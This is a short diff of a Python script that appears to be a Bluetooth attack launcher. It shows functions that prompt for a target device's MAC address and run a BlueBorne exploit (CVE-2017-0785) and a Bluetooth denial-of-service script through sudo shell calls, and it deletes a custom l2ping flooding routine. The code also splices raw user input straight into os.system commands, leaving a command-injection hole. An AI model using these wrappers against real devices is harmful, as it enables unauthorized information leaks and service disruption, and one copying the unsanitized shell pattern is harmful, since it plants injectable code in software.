@@ -66,12 +66,6 @@ def blueborne():
     mac = input("Write target MAC address: ")
     os.system("sudo python3 CVE-2017-0785.py TARGET=" + mac)
 
-#Custom DoS, not functional, use 100 and 600 for default values
-def DoS(seq, size):
-    mac = input("Write target MAC address: ")
-    os.system("sudo seq " + str(seq) + " > numberofpings")
-    os.system("while read r; do l2ping -s " + str(size) + " " + mac + "; done < numberofpings")
-
 def jieggiDoS():
     os.system("sudo python3 ./BLUETOOTH-DOS-ATTACK.py")
 
